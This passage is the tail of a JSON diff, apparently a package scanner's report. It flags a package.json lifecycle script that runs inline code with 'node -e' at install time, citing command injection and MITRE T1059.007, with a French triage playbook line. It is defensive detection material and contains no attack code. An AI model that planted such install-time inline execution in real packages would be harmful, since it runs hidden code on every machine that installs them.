+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-007",
+          "rule_name": "Node Inline Execution in Lifecycle Script",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.007",
+          "playbook": "node -e dans un script lifecycle. Code inline execute a l'installation. Analyser le code inline.",
+          "points": 10
+        }
+      ]
+    }
+  ]
+}
